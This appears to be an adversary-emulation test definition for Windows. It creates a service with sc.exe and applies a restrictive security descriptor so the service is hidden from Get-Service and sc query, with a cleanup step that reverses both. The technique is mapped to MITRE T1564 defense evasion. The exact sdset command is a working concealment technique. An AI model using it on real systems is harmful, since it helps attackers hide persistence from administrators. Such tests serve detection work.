api_version: "2.0"
name: Create and Hide a Service with sc.exe
description: |
    The following technique utilizes sc.exe and sdset to change the security descriptor of a service and "hide" it from Get-Service or sc query.

    Upon successful execution, sc.exe creates a new service changes the security descriptor.

    https://twitter.com/Alh4zr3d/status/1580925761996828672
    https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format
args:
    - name: service_name
      type: string
      default: AtomicService
    - name: executable_command
      type: string
      default: C:\Windows\System32\calc.exe
uuid: 333c7de0-6fbe-42aa-ac2b-c7e40b18246a
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1564: Hide Artifacts'
requirements:
    platforms:
        - os: windows
steps:
    - name: create-and-hide-a-service-with-sc.exe
      inline: |
        sc.exe create {{.Args.service_name}} binPath= "{{.Args.executable_command}}"
        sc sdset {{.Args.service_name}} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
      executor: command_prompt
      cleanup:
        inline: |
            sc sdset {{.Args.service_name}} "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
            sc.exe delete {{.Args.service_name}}
        executor: command_prompt
